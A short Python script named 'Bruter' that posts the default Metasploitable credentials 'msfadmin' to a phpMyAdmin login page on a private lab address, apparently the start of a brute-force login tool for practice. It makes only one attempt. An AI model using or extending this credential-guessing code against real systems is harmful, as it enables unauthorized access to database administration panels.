import urllib3
from urllib import parse, request

class Bruter:

    postUrl = "http://192.168.2.8/phpMyAdmin/index.php?token=ff022fa5b1845dcf5dfbd84c4e3a4964"
    usernameField = "pma_username"
    passwordField = "pma_password"
    usernameValue = "msfadmin"
    passwordValue = "msfadmin"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    parameters = parse.urlencode({usernameField: usernameValue, passwordField: passwordValue}).encode("utf8")

    def __init__(self):
        print("Starting..")
        _request = request.Request(self.postUrl, data=self.parameters, headers=self.headers, method="POST")
        response = request.urlopen(_request)
        print(_request)

Bruter()
